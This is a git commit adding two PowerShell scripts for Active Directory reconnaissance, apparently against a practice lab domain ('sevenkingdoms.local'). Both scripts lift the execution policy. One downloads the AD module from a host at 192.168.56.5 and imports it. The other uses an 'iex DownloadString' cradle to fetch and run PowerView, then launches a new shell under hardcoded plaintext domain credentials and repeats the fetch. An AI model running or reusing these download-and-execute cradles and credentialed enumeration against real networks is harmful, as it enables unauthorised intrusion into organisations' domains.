53985a26266838449533987ed8497bd47e62ea1b
jasoncee01 <89400772+jasoncee01@users.noreply.github.com>
2024-10-31 21:01:28 -0400

    Add files via upload

---
+++ ADModShell.ps1
@@ -0,0 +1,22 @@
+﻿Set-ExecutionPolicy -Scope CurrentUser Unrestricted -Force
+
+Invoke-WebRequest -Uri http://192.168.56.5:8001/ADModule-master.zip -OutFile C:\Users\robb.stark\ADMod\adzip.zip
+
+Expand-Archive -Path C:\Users\robb.stark\ADMod\adzip.zip -DestinationPath C:\Users\robb.stark\ADMod
+
+$directoryADMod = "C:\Users\robb.stark\ADMod\ADModule-master"
+
+Get-ChildItem -Path $directoryADMod -Recurse | Unblock-File
+
+Import-Module C:\Users\robb.stark\ADMod\ADModule-master\Microsoft.ActiveDirectory.Management.dll -Force
+
+Import-Module C:\Users\robb.stark\ADMod\ADModule-master\ActiveDirectory\ActiveDirectory.psd1 -Force
+
+Get-ADDefaultDomainPasswordPolicy
+
+$username= "sevenkingdoms.local\robert.baratheon"
+$password= ConvertTo-SecureString "iamthekingoftheworld" -AsPlainText -Force
+
+$credential = New-Object System.Management.Automation.PSCredential($username,$password)
+
+Get-ADDefaultDomainPasswordPolicy -Credential $credential
---
+++ PowerViewShell.ps1
@@ -0,0 +1,15 @@
+﻿Set-ExecutionPolicy -Scope CurrentUser Unrestricted -Force
+
+iex (New-Object Net.WebClient).DownloadString("http://192.168.56.5:8001/PowerView.ps1")
+
+Get-NetDomain
+
+(Get-DomainPolicy).systemaccess
+
+$username= "sevenkingdoms.local\robert.baratheon"
+$password= ConvertTo-SecureString "iamthekingoftheworld" -AsPlainText -Force
+
+$credential = New-Object System.Management.Automation.PSCredential($username,$password)
+
+Start-Process powershell.exe -Credential $credential -ArgumentList "-NoExit", "-Command",
+"iex (New-Object Net.WebClient).DownloadString('http://192.168.56.5:8001/PowerView.ps1');whoami; (get-domainpolicy).systemaccess"
